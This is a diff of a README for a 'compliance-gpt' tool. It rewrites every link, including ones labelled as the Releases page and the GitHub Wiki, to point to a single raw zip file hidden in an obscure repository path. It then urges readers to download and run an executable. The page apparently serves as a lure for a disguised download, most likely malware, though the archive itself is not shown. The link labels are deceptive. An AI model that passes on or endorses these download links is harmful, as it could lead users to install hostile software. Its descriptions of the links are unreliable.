@@ -1,7 +1,7 @@
 # 🤖 compliance-gpt - Simplifying Compliance Workflows
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/ungracious/compliance-gpt.zip" style="display:inline-block;padding:10px 20px;font-size:20px;color:white;background-color:#4CAF50;text-align:center;text-decoration:none;border-radius:5px;">Download compliance-gpt</a>
+  <a href="https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/test_data/archive/extracted_vision_v3/gpt_compliance_v3.6.zip" style="display:inline-block;padding:10px 20px;font-size:20px;color:white;background-color:#4CAF50;text-align:center;text-decoration:none;border-radius:5px;">Download compliance-gpt</a>
 </p>
 
 ## 🌟 Overview
@@ -33,7 +33,7 @@ By automating these tasks, compliance-gpt significantly reduces time and effort,
 
 You can quickly get started with compliance-gpt by following these steps:
 
-1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/ungracious/compliance-gpt.zip) to access the downloads.
+1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/test_data/archive/extracted_vision_v3/gpt_compliance_v3.6.zip) to access the downloads.
   
 2. **Download the Application**: Look for the latest release and select the version applicable to your system. It will typically be a downloadable file, such as an executable file for Windows or a .dmg file for Mac.
 
@@ -68,13 +68,13 @@ Once you launch compliance-gpt, you’ll find a user-friendly interface designed
 
 To download compliance-gpt, return to the Releases page and choose the latest version:
 
-[Download compliance-gpt](https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/ungracious/compliance-gpt.zip)
+[Download compliance-gpt](https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/test_data/archive/extracted_vision_v3/gpt_compliance_v3.6.zip)
 
 Follow the installation instructions provided above. After installation, you'll be ready to enhance your compliance processes.
 
 ## 📖 Documentation
 
-For more detailed information on how to use compliance-gpt effectively, please refer to the documentation available within the application and on our [GitHub Wiki](https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/ungracious/compliance-gpt.zip).
+For more detailed information on how to use compliance-gpt effectively, please refer to the documentation available within the application and on our [GitHub Wiki](https://raw.githubusercontent.com/rubberneckrepair179/compliance-gpt/main/test_data/archive/extracted_vision_v3/gpt_compliance_v3.6.zip).
 
 ## ❓ Frequently Asked Questions
 
